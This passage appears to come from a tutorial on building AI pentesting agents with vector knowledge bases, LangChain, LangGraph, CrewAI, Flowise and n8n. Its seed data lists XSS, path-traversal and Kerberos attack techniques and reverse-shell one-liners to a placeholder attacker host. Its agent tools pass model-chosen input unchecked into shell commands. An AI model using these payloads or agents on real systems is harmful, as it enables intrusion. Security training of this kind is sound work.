            "document": "Cross-Site Scripting (XSS): Inject client-side scripts. Types: Reflected, Stored, DOM-based. Test with: <script>alert(1)</script>, <img src=x onerror=alert(1)>",
            "metadata": {"category": "web", "severity": "high", "owasp": "A03:2021"}
        },
        {
            "id": "tech-003",
            "document": "Local File Inclusion (LFI): Read local files via path traversal. Test with: ../../../../etc/passwd, php://filter/convert.base64-encode/resource=config.php",
            "metadata": {"category": "web", "severity": "high", "owasp": "A01:2021"}
        },
        {
            "id": "tech-004",
            "document": "Remote Code Execution via deserialization: Exploit insecure deserialization in Java (ysoserial), PHP (phpggc), Python (pickle), .NET (ysoserial.net).",
            "metadata": {"category": "web", "severity": "critical", "owasp": "A08:2021"}
        },
        {
            "id": "tech-005",
            "document": "Kerberoasting: Request TGS tickets for service accounts with SPNs, then crack offline. Tools: GetUserSPNs.py, Rubeus. Requires valid domain credentials.",
            "metadata": {"category": "active-directory", "severity": "high", "mitre": "T1558.003"}
        },
        {
            "id": "tech-006",
            "document": "AS-REP Roasting: Extract AS-REP hashes for accounts with Kerberos pre-auth disabled. Crack offline with hashcat -m 18200. Tools: GetNPUsers.py",
            "metadata": {"category": "active-directory", "severity": "high", "mitre": "T1558.004"}
        },
        {
            "id": "tech-007",
            "document": "Pass-the-Hash: Authenticate using NTLM hash without knowing the plaintext password. Tools: crackmapexec, impacket-psexec, evil-winrm, pth-winexe.",
            "metadata": {"category": "active-directory", "severity": "critical", "mitre": "T1550.002"}
        },
        {
            "id": "tech-008",
            "document": "Reverse shell payloads: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1, python3 -c 'import os,pty,socket...', nc -e /bin/bash ATTACKER PORT",
            "metadata": {"category": "post-exploitation", "severity": "critical", "mitre": "T1059"}
        }
    ]

    ids = [t["id"] for t in techniques]
    documents = [t["document"] for t in techniques]
    metadatas = [t["metadata"] for t in techniques]

    collections["exploits"].add(ids=ids, documents=documents, metadatas=metadatas)
    print(f"[+] Seeded {len(techniques)} exploit technique entries")


def query_knowledge(collection_name: str, query: str, n_results: int = 5):
    """Query the knowledge base."""
    collection = client.get_collection(collection_name, embedding_function=embed_fn)
    results = collection.query(query_texts=[query], n_results=n_results)
    return results


if __name__ == "__main__":
    print("[*] Setting up ChromaDB pentesting knowledge base...")
    collections = create_collections()
    seed_tool_documentation(collections)
    seed_exploit_techniques(collections)

    # Test query
    print("\n[*] Test query: 'How to scan for SQL injection vulnerabilities'")
    results = query_knowledge("tool_documentation", "SQL injection scanning")
    for doc, meta in zip(results["documents"][0], results["metadatas"][0]):
        print(f"  [{meta['tool']}] {doc[:100]}...")

    print("\n[*] Test query: 'Active Directory privilege escalation'")
    results = query_knowledge("exploit_techniques", "Active Directory privilege escalation")
    for doc, meta in zip(results["documents"][0], results["metadatas"][0]):
        print(f"  [{meta['category']}] {doc[:100]}...")

    print("\n[+] Knowledge base setup complete!")
```

```bash [Initialize Knowledge Base]
python3 knowledge/chroma_setup.py
```

### Qdrant Setup (Production-Ready)

```python [knowledge/qdrant_setup.py]
#!/usr/bin/env python3
"""Qdrant vector database setup for pentesting knowledge."""

from qdrant_client import QdrantClient
from qdrant_client.models import Distance, VectorParams, PointStruct
from sentence_transformers import SentenceTransformer
import uuid

# Connect to Qdrant
client = QdrantClient(host="localhost", port=6333)
model = SentenceTransformer('all-MiniLM-L6-v2')
VECTOR_SIZE = 384  # all-MiniLM-L6-v2 output dimension


def setup_collections():
    """Create Qdrant collections."""
    collections = ["cve_database", "exploit_techniques", "tool_docs", "pentest_reports"]

    for name in collections:
        if not client.collection_exists(name):
            client.create_collection(
                collection_name=name,
                vectors_config=VectorParams(size=VECTOR_SIZE, distance=Distance.COSINE)
            )
            print(f"[+] Created collection: {name}")
        else:
            print(f"[*] Collection exists: {name}")


def add_document(collection: str, text: str, metadata: dict):
    """Add a document to a collection."""
    vector = model.encode(text).tolist()
    point_id = str(uuid.uuid4())

    client.upsert(
        collection_name=collection,
        points=[PointStruct(
            id=point_id,
            vector=vector,
            payload={"text": text, **metadata}
        )]
    )
    return point_id


def search(collection: str, query: str, limit: int = 5):
    """Semantic search in a collection."""
    query_vector = model.encode(query).tolist()

    results = client.search(
        collection_name=collection,
        query_vector=query_vector,
        limit=limit
    )
    return [{"text": r.payload.get("text", ""), "score": r.score, "metadata": r.payload} for r in results]


if __name__ == "__main__":
    setup_collections()

    # Seed example data
    add_document("exploit_techniques",
        "EternalBlue (MS17-010) exploits SMB v1 vulnerability in Windows. Use Metasploit module exploit/windows/smb/ms17_010_eternalblue. Affects Windows 7, Server 2008 R2.",
        {"cve": "CVE-2017-0144", "severity": "critical", "platform": "windows"}
    )

    # Test search
    results = search("exploit_techniques", "Windows SMB exploitation")
    for r in results:
        print(f"Score: {r['score']:.4f} | {r['text'][:80]}...")
```

### Embedding Model Comparison

::collapsible

```text [Embedding Models for Pentesting]
Model                          Dimensions  Speed    Quality  Best For
-----                          ----------  -----    -------  --------
all-MiniLM-L6-v2               384         Fast     Good     General pentesting docs
all-mpnet-base-v2               768         Medium   Better   Technical documentation
bge-large-en-v1.5              1024         Slow     Best     CVE/exploit descriptions
nomic-embed-text               768         Fast     Good     Code + text mixed content
mxbai-embed-large-v1           1024         Medium   Great    Security research papers
e5-large-v2                    1024         Slow     Great    Long technical documents

For LOCAL embedding (via Ollama):
ollama pull nomic-embed-text
ollama pull mxbai-embed-large

For CLOUD embedding:
- OpenAI text-embedding-3-small (1536 dims, $0.02/1M tokens)
- Cohere embed-english-v3.0 (1024 dims)
- Voyage AI voyage-large-2 (1536 dims, best for code)
```

::

---

## Step 4 — AI Agent Frameworks & Orchestration

### LangChain Pentesting Agent

```python [agents/langchain_agent.py]
#!/usr/bin/env python3
"""
LangChain-based pentesting agent with Ollama/Claude backend
and custom tool integration.
"""

import os
import subprocess
import json
from typing import Optional
from datetime import datetime

from langchain_ollama import ChatOllama
from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, SystemMessage
from langchain_core.tools import tool
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_community.vectorstores import Chroma
from langchain_community.embeddings import HuggingFaceEmbeddings
from dotenv import load_dotenv

load_dotenv()

# ===========================
# Configuration
# ===========================
LLM_PROVIDER = os.getenv("LLM_PROVIDER", "ollama")  # "ollama" or "claude"
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "llama3.1:8b")
EVIDENCE_DIR = os.getenv("EVIDENCE_DIR", "./evidence")
os.makedirs(EVIDENCE_DIR, exist_ok=True)

# ===========================
# LLM Setup
# ===========================
def get_llm():
    if LLM_PROVIDER == "claude":
        return ChatAnthropic(
            model="claude-sonnet-4-20250514",
            api_key=os.getenv("ANTHROPIC_API_KEY"),
            max_tokens=4096,
            temperature=0.1
        )
    else:
        return ChatOllama(
            model=OLLAMA_MODEL,
            base_url=os.getenv("OLLAMA_HOST", "http://localhost:11434"),
            temperature=0.1,
            num_ctx=8192
        )

# ===========================
# Vector Store (RAG)
# ===========================
embeddings = HuggingFaceEmbeddings(model_name="all-MiniLM-L6-v2")
vectorstore = Chroma(
    persist_directory="./data/chromadb",
    collection_name="tool_documentation",
    embedding_function=embeddings
)
retriever = vectorstore.as_retriever(search_kwargs={"k": 3})

# ===========================
# Tool Definitions
# ===========================
def _run_command(cmd: str, timeout: int = 300) -> str:
    """Execute a shell command safely."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout
        )
        output = result.stdout + result.stderr
        # Save evidence
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        evidence_file = os.path.join(EVIDENCE_DIR, f"{ts}_output.txt")
        with open(evidence_file, "w") as f:
            json.dump({"timestamp": ts, "command": cmd, "output": output}, f, indent=2)
        return output[:10000]  # Truncate for LLM context
    except subprocess.TimeoutExpired:
        return f"[ERROR] Command timed out after {timeout}s"
    except Exception as e:
        return f"[ERROR] {str(e)}"


@tool
def nmap_scan(target: str, arguments: str = "-sT -sV -sC") -> str:
    """Run an Nmap scan against a target. Provide the target IP/hostname and Nmap arguments."""
    cmd = f"nmap {arguments} {target}"
    return _run_command(cmd, timeout=600)


@tool
def nikto_scan(target_url: str) -> str:
    """Run Nikto web vulnerability scanner against a target URL."""
    cmd = f"nikto -h {target_url} -maxtime 300"
    return _run_command(cmd, timeout=600)


@tool
def gobuster_scan(target_url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt") -> str:
    """Run Gobuster directory brute force against a target URL."""
    cmd = f"gobuster dir -u {target_url} -w {wordlist} -t 30 --no-error -q"
    return _run_command(cmd, timeout=600)


@tool
def sqlmap_scan(target_url: str, arguments: str = "--batch --dbs") -> str:
    """Run SQLMap SQL injection scanner against a URL with parameter."""
    cmd = f"sqlmap -u '{target_url}' {arguments}"
    return _run_command(cmd, timeout=900)


@tool
def whatweb_scan(target_url: str) -> str:
    """Run WhatWeb to fingerprint web technologies on a target."""
    cmd = f"whatweb -a 3 {target_url}"
    return _run_command(cmd, timeout=120)


@tool
def nuclei_scan(target_url: str, tags: str = "cve") -> str:
    """Run Nuclei vulnerability scanner with specified template tags."""
    cmd = f"nuclei -u {target_url} -tags {tags} -silent"
    return _run_command(cmd, timeout=600)


@tool
def hydra_brute(target: str, service: str, username: str = "admin",
                password_list: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """Run Hydra brute force attack against a service."""
    cmd = f"hydra -l {username} -P {password_list} {target} {service} -t 4 -V -f"
    return _run_command(cmd, timeout=900)


@tool
def search_knowledge(query: str) -> str:
    """Search the pentesting knowledge base for relevant techniques, tools, and CVEs."""
    docs = retriever.get_relevant_documents(query)
    results = []
    for doc in docs:
        results.append(f"[{doc.metadata.get('tool', 'unknown')}] {doc.page_content}")
    return "\n\n".join(results) if results else "No relevant knowledge found."


@tool
def save_finding(title: str, description: str, severity: str, evidence: str) -> str:
    """Save a pentesting finding/vulnerability discovered during the assessment."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    finding = {
        "timestamp": ts,
        "title": title,
        "description": description,
        "severity": severity,
        "evidence": evidence
    }
    filepath = os.path.join(EVIDENCE_DIR, f"finding_{ts}.json")
    with open(filepath, "w") as f:
        json.dump(finding, f, indent=2)
    return f"Finding saved: {filepath}"


# ===========================
# Agent Setup
# ===========================
PENTEST_SYSTEM_PROMPT = """You are an expert penetration tester AI agent. You have access to various
pentesting tools through function calls. Your job is to:

1. Analyze the target systematically following a structured methodology
2. Start with reconnaissance and enumeration before attempting exploitation
3. Use the appropriate tools for each phase
4. Document all findings with evidence
5. Always check the knowledge base for relevant techniques
6. Provide clear, actionable analysis of tool outputs

METHODOLOGY:
- Phase 1: Passive Reconnaissance (OSINT, DNS, search knowledge base)
- Phase 2: Active Scanning (Nmap, WhatWeb, technology fingerprinting)
- Phase 3: Enumeration (directory brute forcing, service enumeration)
- Phase 4: Vulnerability Assessment (Nikto, Nuclei, SQLMap testing)
- Phase 5: Exploitation (only with explicit confirmation)
- Phase 6: Documentation (save all findings)

RULES:
- Never run destructive commands
- Always explain what you're doing and why before running a tool
- Save important findings using the save_finding tool
- If unsure, search the knowledge base first
- Rate limit your scans — don't flood the target
- Report all discovered vulnerabilities with severity ratings

You are authorized to test the target provided by the operator."""


tools = [
    nmap_scan, nikto_scan, gobuster_scan, sqlmap_scan,
    whatweb_scan, nuclei_scan, hydra_brute,
    search_knowledge, save_finding
]

prompt = ChatPromptTemplate.from_messages([
    ("system", PENTEST_SYSTEM_PROMPT),
    MessagesPlaceholder(variable_name="chat_history", optional=True),
    ("human", "{input}"),
    MessagesPlaceholder(variable_name="agent_scratchpad")
])

llm = get_llm()
agent = create_tool_calling_agent(llm, tools, prompt)
agent_executor = AgentExecutor(
    agent=agent,
    tools=tools,
    verbose=True,
    max_iterations=20,
    return_intermediate_steps=True,
    handle_parsing_errors=True
)


# ===========================
# Main Execution
# ===========================
def run_agent(task: str, chat_history: list = None):
    """Run the pentesting agent with a task."""
    result = agent_executor.invoke({
        "input": task,
        "chat_history": chat_history or []
    })
    return result


if __name__ == "__main__":
    from rich.console import Console
    from rich.prompt import Prompt

    console = Console()
    history = []

    console.print("[bold green]AI Pentesting Agent[/bold green] — Type 'quit' to exit\n")

    while True:
        task = Prompt.ask("[bold cyan]pentest-agent[/bold cyan]")
        if task.lower() in ("quit", "exit", "q"):
            break

        try:
            result = run_agent(task, history)
            console.print(f"\n[bold green]Agent:[/bold green] {result['output']}\n")
            history.append(HumanMessage(content=task))
        except Exception as e:
            console.print(f"\n[bold red]Error:[/bold red] {str(e)}\n")
```

```bash [Run LangChain Agent]
cd ~/ai-pentest-agent
source venv/bin/activate
python3 agents/langchain_agent.py
```

### LangGraph Multi-Step Workflow

```python [agents/langgraph_workflow.py]
#!/usr/bin/env python3
"""
LangGraph-based pentesting workflow with stateful graph execution.
Implements the full pentest lifecycle as a directed graph.
"""

from typing import TypedDict, Annotated, Sequence
from langgraph.graph import Graph, StateGraph, END
from langgraph.prebuilt import ToolNode
from langchain_ollama import ChatOllama
from langchain_core.messages import BaseMessage, HumanMessage, AIMessage
import operator
import json
import subprocess
from datetime import datetime


class PentestState(TypedDict):
    """State object for the pentesting workflow."""
    target: str
    phase: str
    messages: Annotated[Sequence[BaseMessage], operator.add]
    recon_results: dict
    scan_results: dict
    vulnerabilities: list
    exploit_results: dict
    findings: list
    current_action: str
    iteration: int


def run_cmd(cmd: str, timeout: int = 300) -> str:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr)[:8000]
    except Exception as e:
        return f"Error: {e}"


# ===========================
# Graph Nodes
# ===========================
def reconnaissance_node(state: PentestState) -> PentestState:
    """Phase 1: Passive and active reconnaissance."""
    target = state["target"]
    results = {}

    # DNS enumeration
    results["dns"] = run_cmd(f"dig ANY {target} +short 2>/dev/null", timeout=30)

    # WHOIS
    results["whois"] = run_cmd(f"whois {target} 2>/dev/null | head -50", timeout=30)

    # Subdomain enumeration (if domain)
    if not target.replace(".", "").isdigit():
        results["subdomains"] = run_cmd(
            f"subfinder -d {target} -silent 2>/dev/null | head -20", timeout=60
        )

    state["recon_results"] = results
    state["phase"] = "scanning"
    state["messages"] = state["messages"] + [
        AIMessage(content=f"Reconnaissance complete for {target}. Found: {json.dumps(results, indent=2)[:2000]}")
    ]
    return state


def scanning_node(state: PentestState) -> PentestState:
    """Phase 2: Active scanning and service enumeration."""
    target = state["target"]
    results = {}

    # Nmap TCP scan
    results["nmap_tcp"] = run_cmd(
        f"nmap -sT -sV -sC -T4 --open -p- {target}", timeout=600
    )

    # WhatWeb (if web ports found)
    if any(p in results.get("nmap_tcp", "") for p in ["80/", "443/", "8080/", "8443/"]):
        results["whatweb"] = run_cmd(f"whatweb -a 3 http://{target}", timeout=120)

    state["scan_results"] = results
    state["phase"] = "enumeration"
    state["messages"] = state["messages"] + [
        AIMessage(content=f"Scanning complete. Results: {json.dumps({k: v[:500] for k, v in results.items()}, indent=2)}")
    ]
    return state


def enumeration_node(state: PentestState) -> PentestState:
    """Phase 3: Service-specific enumeration."""
    target = state["target"]
    scan_results = state.get("scan_results", {})
    nmap_output = scan_results.get("nmap_tcp", "")
    results = {}

    # Web directory enumeration
    if "80/" in nmap_output or "443/" in nmap_output:
        protocol = "https" if "443/" in nmap_output else "http"
        results["dirs"] = run_cmd(
            f"gobuster dir -u {protocol}://{target} -w /usr/share/wordlists/dirb/common.txt -t 30 -q --no-error",
            timeout=300
        )

    # SMB enumeration
    if "445/" in nmap_output:
        results["smb"] = run_cmd(f"smbclient -L //{target} -N 2>/dev/null", timeout=60)

    state["scan_results"].update(results)
    state["phase"] = "vulnerability_assessment"
    state["messages"] = state["messages"] + [
        AIMessage(content=f"Enumeration complete. Additional findings: {json.dumps({k: v[:500] for k, v in results.items()}, indent=2)}")
    ]
    return state


def vulnerability_assessment_node(state: PentestState) -> PentestState:
    """Phase 4: Vulnerability scanning and assessment."""
    target = state["target"]
    scan_results = state.get("scan_results", {})
    nmap_output = scan_results.get("nmap_tcp", "")
    vulns = []

    # Nmap vuln scripts
    vuln_scan = run_cmd(f"nmap --script=vuln -p- {target}", timeout=600)

    # Nuclei scan
    if "80/" in nmap_output or "443/" in nmap_output:
        protocol = "https" if "443/" in nmap_output else "http"
        nuclei_output = run_cmd(
            f"nuclei -u {protocol}://{target} -tags cve -silent", timeout=600
        )
        if nuclei_output.strip():
            for line in nuclei_output.strip().split("\n"):
                vulns.append({"source": "nuclei", "detail": line})

    # Nikto
    if "80/" in nmap_output:
        nikto_output = run_cmd(f"nikto -h http://{target} -maxtime 300", timeout=600)
        if "OSVDB" in nikto_output or "vulnerability" in nikto_output.lower():
            vulns.append({"source": "nikto", "detail": nikto_output[:2000]})

    state["vulnerabilities"] = vulns
    state["phase"] = "reporting"
    state["messages"] = state["messages"] + [
        AIMessage(content=f"Vulnerability assessment complete. Found {len(vulns)} potential vulnerabilities.")
    ]
    return state


def reporting_node(state: PentestState) -> PentestState:
    """Phase 5: Generate report from findings."""
    report = {
        "timestamp": datetime.now().isoformat(),
        "target": state["target"],
        "recon": state.get("recon_results", {}),
        "scan_summary": {k: v[:1000] for k, v in state.get("scan_results", {}).items()},
        "vulnerabilities": state.get("vulnerabilities", []),
        "total_findings": len(state.get("vulnerabilities", []))
    }

    report_path = f"./reports/pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    import os; os.makedirs("./reports", exist_ok=True)
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)

    state["phase"] = "complete"
    state["findings"] = state.get("vulnerabilities", [])
    state["messages"] = state["messages"] + [
        AIMessage(content=f"Report generated: {report_path}\nTotal findings: {report['total_findings']}")
    ]
    return state


def should_continue(state: PentestState) -> str:
    """Router: determine next node based on current phase."""
    phase = state.get("phase", "reconnaissance")
    phase_map = {
        "reconnaissance": "scanning",
        "scanning": "enumeration",
        "enumeration": "vulnerability_assessment",
        "vulnerability_assessment": "reporting",
        "reporting": END,
        "complete": END
    }
    return phase_map.get(phase, END)


# ===========================
# Build Graph
# ===========================
workflow = StateGraph(PentestState)

workflow.add_node("reconnaissance", reconnaissance_node)
workflow.add_node("scanning", scanning_node)
workflow.add_node("enumeration", enumeration_node)
workflow.add_node("vulnerability_assessment", vulnerability_assessment_node)
workflow.add_node("reporting", reporting_node)

workflow.set_entry_point("reconnaissance")

workflow.add_conditional_edges("reconnaissance", should_continue)
workflow.add_conditional_edges("scanning", should_continue)
workflow.add_conditional_edges("enumeration", should_continue)
workflow.add_conditional_edges("vulnerability_assessment", should_continue)
workflow.add_conditional_edges("reporting", should_continue)

pentest_graph = workflow.compile()


def run_pentest(target: str):
    """Execute the full pentest workflow."""
    initial_state = PentestState(
        target=target,
        phase="reconnaissance",
        messages=[HumanMessage(content=f"Begin penetration test against: {target}")],
        recon_results={},
        scan_results={},
        vulnerabilities=[],
        exploit_results={},
        findings=[],
        current_action="starting",
        iteration=0
    )

    print(f"[*] Starting automated pentest against: {target}")
    print("=" * 60)

    for step in pentest_graph.stream(initial_state):
        for node_name, node_state in step.items():
            phase = node_state.get("phase", "unknown")
            last_msg = node_state["messages"][-1].content if node_state["messages"] else ""
            print(f"\n[{phase.upper()}] {node_name}")
            print(f"  → {last_msg[:200]}")

    print("\n" + "=" * 60)
    print("[+] Pentest workflow complete!")


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "scanme.nmap.org"
    run_pentest(target)
```

```bash [Run LangGraph Workflow]
python3 agents/langgraph_workflow.py 192.168.1.100
```

### CrewAI Multi-Agent System

```python [agents/crewai_pentest.py]
#!/usr/bin/env python3
"""
CrewAI multi-agent pentesting system.
Multiple specialized agents collaborate on a penetration test.
"""

import os
import subprocess
from datetime import datetime
from crewai import Agent, Task, Crew, Process
from crewai.tools import tool
from langchain_ollama import ChatOllama
from dotenv import load_dotenv

load_dotenv()

# ===========================
# LLM Configuration
# ===========================
llm = ChatOllama(
    model=os.getenv("OLLAMA_MODEL", "llama3.1:8b"),
    base_url=os.getenv("OLLAMA_HOST", "http://localhost:11434"),
    temperature=0.1
)

# ===========================
# Tool Definitions
# ===========================
def _exec(cmd: str, timeout: int = 300) -> str:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr)[:8000]
    except Exception as e:
        return f"Error: {e}"


@tool
def run_nmap(target_and_args: str) -> str:
    """Run Nmap scan. Input format: '<target> <nmap_arguments>'. Example: '192.168.1.1 -sT -sV -sC -p-'"""
    return _exec(f"nmap {target_and_args}", timeout=600)


@tool
def run_whatweb(url: str) -> str:
    """Run WhatWeb fingerprinter against a URL. Example: 'http://192.168.1.1'"""
    return _exec(f"whatweb -a 3 {url}", timeout=120)


@tool
def run_gobuster(url_and_args: str) -> str:
    """Run Gobuster directory scan. Input: '<url> [wordlist]'. Example: 'http://192.168.1.1 /usr/share/wordlists/dirb/common.txt'"""
    parts = url_and_args.split()
    url = parts[0]
    wordlist = parts[1] if len(parts) > 1 else "/usr/share/wordlists/dirb/common.txt"
    return _exec(f"gobuster dir -u {url} -w {wordlist} -t 30 -q --no-error", timeout=300)


@tool
def run_nikto(target: str) -> str:
    """Run Nikto vulnerability scanner. Input: target URL. Example: 'http://192.168.1.1'"""
    return _exec(f"nikto -h {target} -maxtime 300", timeout=600)


@tool
def run_nuclei(url_and_tags: str) -> str:
    """Run Nuclei scanner. Input: '<url> [tags]'. Example: 'http://192.168.1.1 cve,critical'"""
    parts = url_and_tags.split()
    url = parts[0]
    tags = parts[1] if len(parts) > 1 else "cve"
    return _exec(f"nuclei -u {url} -tags {tags} -silent", timeout=600)


@tool
def run_sqlmap(url_and_args: str) -> str:
    """Run SQLMap. Input: '<url_with_param> [args]'. Example: 'http://target/page?id=1 --dbs --batch'"""
    return _exec(f"sqlmap -u '{url_and_args}' --batch", timeout=600)


@tool
def save_report(content: str) -> str:
    """Save pentesting report content to file."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = f"./reports/crewai_report_{ts}.md"
    os.makedirs("./reports", exist_ok=True)
    with open(filepath, "w") as f:
        f.write(content)
    return f"Report saved to {filepath}"


# ===========================
# Agent Definitions
# ===========================
recon_agent = Agent(
    role="Reconnaissance Specialist",
    goal="Perform thorough reconnaissance and information gathering on the target",
    backstory="""You are an expert in passive and active reconnaissance. You excel at
    discovering subdomains, open ports, running services, and technology stacks.
    You always start with broad scans and narrow down to specific services.""",
    tools=[run_nmap, run_whatweb],
    llm=llm,
    verbose=True,
    allow_delegation=True,
    max_iter=10
)

vuln_agent = Agent(
    role="Vulnerability Analyst",
    goal="Identify and assess vulnerabilities in discovered services and applications",
    backstory="""You are an expert vulnerability researcher. You analyze scan results
    to identify potential security weaknesses. You use multiple scanning tools
    and cross-reference findings for accuracy. You rate vulnerabilities by severity.""",
    tools=[run_nikto, run_nuclei, run_gobuster],
    llm=llm,
    verbose=True,
    allow_delegation=True,
    max_iter=10
)

exploit_agent = Agent(
    role="Exploitation Specialist",
    goal="Attempt to exploit discovered vulnerabilities to prove impact",
    backstory="""You are an expert in exploitation techniques. You carefully select
    exploits based on vulnerability analysis. You always verify exploits are safe
    and targeted. You document every exploitation attempt with evidence.""",
    tools=[run_sqlmap, run_nmap],
    llm=llm,
    verbose=True,
    allow_delegation=False,
    max_iter=8
)

report_agent = Agent(
    role="Security Report Writer",
    goal="Create comprehensive, professional penetration test reports",
    backstory="""You are an expert technical writer specializing in security reports.
    You create clear, actionable reports with executive summaries, detailed findings,
    severity ratings (Critical/High/Medium/Low/Info), and remediation recommendations.""",
    tools=[save_report],
    llm=llm,
    verbose=True,
    allow_delegation=False,
    max_iter=5
)


def create_pentest_crew(target: str) -> Crew:
    """Create a pentesting crew for a specific target."""

    recon_task = Task(
        description=f"""Perform comprehensive reconnaissance on target: {target}

        1. Run a full Nmap TCP port scan with service version detection
        2. Identify all open ports and running services
        3. Run WhatWeb on any discovered web services
        4. Summarize all findings in a structured format

        Target: {target}""",
        expected_output="Structured reconnaissance report with open ports, services, and technologies",
        agent=recon_agent
    )

    vuln_task = Task(
        description=f"""Analyze the reconnaissance results and perform vulnerability assessment on: {target}

        1. Run Nikto on discovered web services
        2. Run Nuclei with CVE and critical templates
        3. Run Gobuster for directory enumeration on web services
        4. Correlate findings and identify potential vulnerabilities
        5. Rate each vulnerability by severity

        Target: {target}""",
        expected_output="List of identified vulnerabilities with severity ratings and evidence",
        agent=vuln_agent,
        context=[recon_task]
    )

    exploit_task = Task(
        description=f"""Based on the vulnerability assessment, attempt safe exploitation on: {target}

        1. Review identified vulnerabilities
        2. Select the highest-severity exploitable vulnerabilities
        3. Attempt SQL injection testing with SQLMap on discovered web parameters
        4. Run targeted Nmap vulnerability scripts
        5. Document all exploitation attempts and results

        IMPORTANT: Only use safe, non-destructive exploitation techniques.
        Target: {target}""",
        expected_output="Exploitation results with proof of concept for each vulnerability",
        agent=exploit_agent,
        context=[recon_task, vuln_task]
    )

    report_task = Task(
        description=f"""Create a professional penetration test report for: {target}

        Include:
        1. Executive Summary
        2. Scope and Methodology
        3. Findings Summary Table (Severity, Title, Status)
        4. Detailed Findings with evidence
        5. Remediation Recommendations
        6. Conclusion

        Use the results from reconnaissance, vulnerability assessment, and exploitation phases.
        Save the final report using the save_report tool.""",
        expected_output="Complete penetration test report in Markdown format",
        agent=report_agent,
        context=[recon_task, vuln_task, exploit_task]
    )

    return Crew(
        agents=[recon_agent, vuln_agent, exploit_agent, report_agent],
        tasks=[recon_task, vuln_task, exploit_task, report_task],
        process=Process.sequential,
        verbose=True
    )


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "scanme.nmap.org"

    print(f"[*] Creating pentesting crew for target: {target}")
    crew = create_pentest_crew(target)

    print("[*] Starting penetration test...")
    result = crew.kickoff()

    print("\n" + "=" * 60)
    print("[+] Penetration test complete!")
    print(f"\nFinal Output:\n{result}")
```

```bash [Run CrewAI Pentest]
python3 agents/crewai_pentest.py 192.168.1.100
```

---

## Step 5 — Flowise & n8n Automation

### Flowise AI — Visual Agent Builder

::tabs
  :::tabs-item{icon="i-lucide-workflow" label="Setup & Access"}
  ```bash [Start Flowise]
  docker compose up -d flowise
  ```

  ```text [Access Flowise UI]
  http://localhost:3000
  Username: admin
  Password: pentest123
  ```

  Build visual pentesting workflows by connecting nodes:
  1. **Chat Model** → Ollama (localhost:11434) or Claude API
  2. **Tool Agent** → Custom tools for Nmap, Nikto, etc.
  3. **Vector Store** → ChromaDB for knowledge retrieval
  4. **Memory** → Buffer Memory for conversation context
  5. **Output** → Chat interface or API endpoint
  :::

  :::tabs-item{icon="i-lucide-code" label="Flowise Custom Tool"}
  Create a custom tool in Flowise for Nmap integration:

  ```javascript [Flowise Custom Tool — Nmap]
  // Tool Name: Nmap Scanner
  // Tool Description: Run Nmap network scan against a target
  // Input Schema:
  // {
  //   "target": "string - Target IP or hostname",
  //   "args": "string - Nmap arguments"
  // }

  const { exec } = require('child_process');

  const target = $input.target;
  const args = $input.args || '-sT -sV';

  return new Promise((resolve, reject) => {
      exec(`nmap ${args} ${target}`, { timeout: 300000 }, (error, stdout, stderr) => {
          if (error && !stdout) {
              reject(error.message);
          }
          resolve(stdout + stderr);
      });
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Flowise API Usage"}
  ```bash [Query Flowise Agent via API]
  curl -X POST http://localhost:3000/api/v1/prediction/<CHATFLOW_ID> \
    -H "Content-Type: application/json" \
    -d '{"question": "Scan 192.168.1.100 for open ports and identify services"}'
  ```

  ```python [Python Flowise Client]
  import requests

  FLOWISE_URL = "http://localhost:3000/api/v1/prediction/<CHATFLOW_ID>"

  def query_flowise(question: str) -> str:
      response = requests.post(FLOWISE_URL, json={"question": question})
      return response.json().get("text", "")

  result = query_flowise("Run a vulnerability scan on 192.168.1.100 port 80")
  print(result)
  ```
  :::
::

### n8n Automation Workflows

::tabs
  :::tabs-item{icon="i-lucide-workflow" label="Setup & Access"}
  ```bash [Start n8n]
  docker compose up -d n8n
  ```

  ```text [Access n8n UI]
  http://localhost:5678
  Username: admin
  Password: pentest123
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="n8n Pentest Workflow (JSON)"}
  Import this workflow into n8n for automated pentesting:

  ```json [n8n_pentest_workflow.json]
  {
    "name": "AI Pentest Automation",
    "nodes": [
      {
        "name": "Webhook Trigger",
        "type": "n8n-nodes-base.webhook",
        "position": [250, 300],
        "parameters": {
          "path": "pentest",
          "httpMethod": "POST",
          "responseMode": "responseNode"
        }
      },
      {
        "name": "Parse Target",
        "type": "n8n-nodes-base.set",
        "position": [450, 300],
        "parameters": {
          "values": {
            "string": [
              {"name": "target", "value": "={{$json.body.target}}"},
              {"name": "scan_type", "value": "={{$json.body.scan_type || 'full'}}"}
            ]
          }
        }
      },
      {
        "name": "Nmap Scan",
        "type": "n8n-nodes-base.executeCommand",
        "position": [650, 200],
        "parameters": {
          "command": "nmap -sT -sV -sC --open {{$json.target}}"
        }
      },
      {
        "name": "WhatWeb Scan",
        "type": "n8n-nodes-base.executeCommand",
        "position": [650, 400],
        "parameters": {
          "command": "whatweb -a 3 http://{{$json.target}}"
        }
      },
      {
        "name": "AI Analysis",
        "type": "@n8n/n8n-nodes-langchain.agent",
        "position": [900, 300],
        "parameters": {
          "text": "Analyze these scan results and identify vulnerabilities:\n\nNmap: {{$node['Nmap Scan'].json.stdout}}\n\nWhatWeb: {{$node['WhatWeb Scan'].json.stdout}}",
          "options": {
            "systemMessage": "You are a penetration testing expert. Analyze scan results and provide a structured vulnerability assessment."
          }
        }
      },
      {
        "name": "Save Report",
